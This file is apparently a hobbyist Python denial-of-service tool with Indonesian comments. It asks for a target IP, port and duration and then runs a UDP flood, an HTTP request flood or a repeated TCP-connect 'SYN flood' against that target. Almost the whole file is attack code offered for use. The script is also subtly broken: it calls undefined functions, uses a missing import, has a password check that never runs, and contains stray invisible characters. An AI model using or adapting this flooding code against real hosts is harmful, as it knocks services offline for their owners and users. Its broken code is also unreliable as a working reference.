‎# !/usr/bin/python3.12
‎# -*- coding: utf-8 -*-
import os
import sys
import requests
import time
import socket
import random
import string
os.system("clear")
print()

# Clearing the SCREEN
class colors:
    BLACK = "\033[30m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    

os.system("clear")
os.system("\033[103m \033[32mkunkaffa3@gmail.com \033[0m")
print("\033[101m \033[33m DILARANG NGIBUL ...!!\033[0m")
time.sleep(5)
print("Loading.......")

attemps = 0
os.system("clear")
print("""

""")
‎‎‎‎# Password authentication function
‎def authenticate():
    ‎password = "BASe" # The password to access the tool
    ‎user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
‎
    if user_password != password:
       ‎print("\033[1;31mIncorrect password. Exiting...\033[0m")
       attemps += 1
       ‎exit()
‎
# Meminta IP dan port target
ip = input("Enter the target IP: ")
try:
    port = int(input("Enter the target port: "))
except ValueError:
    print("Invalid port. Exiting...")
    sys.exit()

# Durasi waktu serangan (second)
try:
    dur = int(input("Enter the duration of the attack in seconds: "))
except ValueError:
    print("Durasi tidak valid. Keluar..")
    sys.exit()

# Fungsi untuk melakukan serangan Banjir UDP


def udp_flood(ip, port, message, dur):
    # Create the UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Tetapkan batas waktu untuk soket agar program tidak macet
    s.settimeout(dur)

    # Alamat IP dan nomor port dari host target
    target = (ip, port)

    # Mulai mengirim paket
    start_time = time.time()
    packet_count = 0
    while True:
        # Send the message to the target host
        try:
            s.sendto(message, target)
            packet_count += 1
            print(f"Sent packet {packet_count}")
        except socket.error:
            # Jika soket tidak dapat mengirim paket, hentikan loop
            break

        # Jika durasi yang ditentukan telah lewat, hentikan loop
        if time.time() - start_time >= dur:
            break

    # Close the socket
    s.close()

# Fungsi untuk melakukan serangan SYN Flood
def syn_flood(ip, port, duration):
    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sent += 1
            print(f"SYN Packets sent: {sent} to target: {ip}")
            sock.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print("\n[*] Attack stopped.")
            sys.exit()
        finally:
            sock.close()  # Make sure to close the socket in all cases 
# Function to perform the HTTP Flood attack

def http_flood(ip, port, duration):
    # create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # create HTTP request
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"

    sent = 0
    timeout = time.time() + int(dur)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            # Re-create the socket for each iteration
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(f"HTTP Packets sent: {sent} to target: {ip}")
        except KeyboardInterrupt:
            print("\n[-] Attack stopped by user")
            break
    sock.close()


# Prompt for the type of attack
attack_type = input((
    "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))

if attack_type == "1":
    message = b"Sending 1337 packets baby"
    print(("UDP attack selected", "red"))
    udp_flood(ip, port, message, dur)
    print(("UDP attack completed", "red"))
elif attack_type == "3":
    print(("SYN attack selected", "red"))
    syn_flood(ip, port, dur)
elif attack_type == "2":
    print(colored("HTTP attack selected", "red"))
    http_flood(ip, port, dur)
else:
    print(colored("Invalid attack type. Exiting...", "green"))
    sys.exit()
